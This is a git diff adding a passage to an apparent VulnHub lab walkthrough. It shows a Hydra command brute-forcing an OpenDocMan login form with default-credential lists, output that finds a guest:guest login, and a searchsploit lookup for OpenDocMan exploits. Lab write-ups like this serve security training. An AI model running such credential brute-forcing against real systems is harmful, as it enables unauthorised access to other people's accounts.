@@ -99,7 +99,29 @@ there is nothing interesting in these directories, so let's check the `/jabcd0cs
 
 ![docman](https://github.com/Git-K3rnel/VulnHub/assets/127470407/47cbb7ec-3500-4723-878d-6fa4fb98b793)
 
+here i just brute force the page with some default credentials :
 
+```text
+root@kali: hydra -L /default-usernames.txt  -P /default-usernames.txt 192.168.56.104 http-post-form "/jabcd0cs/:frmuser=^USER^&frmpass=^PASS^&login=Enter:Error" -v
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-26 04:47:04
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 576 login tries (l:24/p:24), ~36 tries per task
+[DATA] attacking http-post-form://192.168.56.104:80/jabcd0cs/:frmuser=^USER^&frmpass=^PASS^&login=Enter:Error
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] Page redirected to http[s]://192.168.56.104:80/jabcd0cs/out.php
+[80][http-post-form] host: 192.168.56.104   login: guest   password: guest
+[STATUS] attack finished for 192.168.56.104 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+```
+
+yes, i found `guest:guest` here, tried several ways to get a web shell but didn't work.
+
+so i checked `searchsploit` for any known exploit for `opendocman` :
+
+```text
+root@kali: searchsploit opendocman
+
+OpenDocMan 1.2.7 - Multiple Vulnerabilities  | php/webapps/32075.txt
 
 
 
